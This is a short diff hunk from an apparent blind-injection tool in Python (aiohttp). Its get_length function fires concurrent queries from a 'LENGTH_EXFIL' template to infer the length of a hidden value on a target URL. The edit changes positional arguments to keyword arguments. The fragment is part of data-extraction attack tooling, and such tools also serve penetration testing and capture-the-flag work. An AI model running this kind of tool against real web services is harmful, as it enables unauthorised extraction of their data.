@@ -77,7 +77,7 @@ async def question(url:str, sub_query: str, response_truth_condition:Callable[[a
 async def get_length(url:str, sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lower_bound: int = 1, upper_bound: int = 65, query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
         cr_length = [
-            blind_query(session, response_truth_condition, url, QUERIES['LENGTH_EXFIL'](sub_query,i), str(i), query_encoder=query_encoder)
+            blind_query(session=session,response_truth_condition=response_truth_condition, url=url, sub_query=QUERIES['LENGTH_EXFIL'](sub_query,i),ordinal=str(i),query_encoder=query_encoder)
             for i in range(lower_bound, upper_bound)
         ]
         strlen = int(await run_until_found(cr_length))
